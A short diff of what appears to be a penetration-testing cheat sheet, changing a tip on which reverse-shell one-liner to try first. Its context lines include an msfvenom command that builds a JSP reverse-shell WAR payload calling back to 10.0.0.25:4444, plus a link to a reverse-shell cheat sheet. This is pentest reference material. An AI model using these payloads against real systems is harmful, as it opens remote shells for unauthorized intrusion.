@@ -748,7 +748,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.25 LPORT=4444 -f war > runme
 
 #### Reverse-shell One-liners
 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-- Try first, then last, then 2,3,4...
+- Try first, then last (mkfifo), then 2,3,4...
 
 ```
 whereis netcat
